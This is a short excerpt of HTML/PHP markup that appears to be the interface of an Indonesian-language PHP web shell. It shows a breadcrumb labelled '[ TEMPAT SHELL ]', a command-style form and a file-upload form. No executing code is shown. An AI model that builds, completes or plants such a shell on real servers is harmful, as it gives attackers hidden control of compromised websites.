    ...
    <div class="py-3" id="main">
      <div class="box shadow bg-dark p-4 rounded-3">
        ...
        <div class="breadcrumb">
          ...
          <?php endif; ?>
          <?php endforeach; ?>
          <a href="?" class="text-decoration-none text-light">&nbsp;[ TEMPAT SHELL ]</a>
        </div>
          ...
          <div class="p-2">
            <form action="" method="post">
              <div class="row">
                ...
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-light btn-sm">GASIN</button>
                </div>
              </div>
            </form>
          </div>
          <div class="p-2">
            <form action="" method="post" enctype="multipart/form-data">
              <div class="row">
                ...
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-light btn-sm">UPLOAD DISINI</button>
                </div>
              </div>
            </form>
          </div>
